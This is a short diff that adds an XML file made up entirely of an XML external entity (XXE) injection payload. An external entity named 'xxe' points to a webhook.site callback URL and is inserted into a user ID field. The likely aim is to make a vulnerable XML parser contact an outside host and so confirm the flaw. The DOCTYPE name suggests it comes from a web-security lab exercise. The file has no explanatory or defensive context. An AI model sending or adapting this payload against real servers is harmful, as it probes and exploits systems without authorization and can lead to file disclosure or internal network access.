@@ -1,0 +1,4 @@
+<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "https://webhook.site/56aca04d-e3d9-4bd1-9a91-aeb5ba4227ad"> ]>
+<user>
+    <id_user>&xxe;</id_user>
+</user>
